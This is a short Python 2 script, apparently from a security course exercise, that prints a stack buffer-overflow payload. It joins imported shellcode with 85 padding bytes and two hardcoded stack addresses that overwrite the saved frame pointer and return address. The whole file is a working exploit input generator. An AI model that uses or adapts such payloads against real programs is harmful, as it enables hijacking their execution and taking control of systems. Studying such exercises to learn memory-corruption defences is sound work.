from shellcode import shellcode
from struct import pack
print shellcode + "A"*(1 + 4*21) + pack("<I", 0xbffea448) + pack("<I", 0xbffea3bc)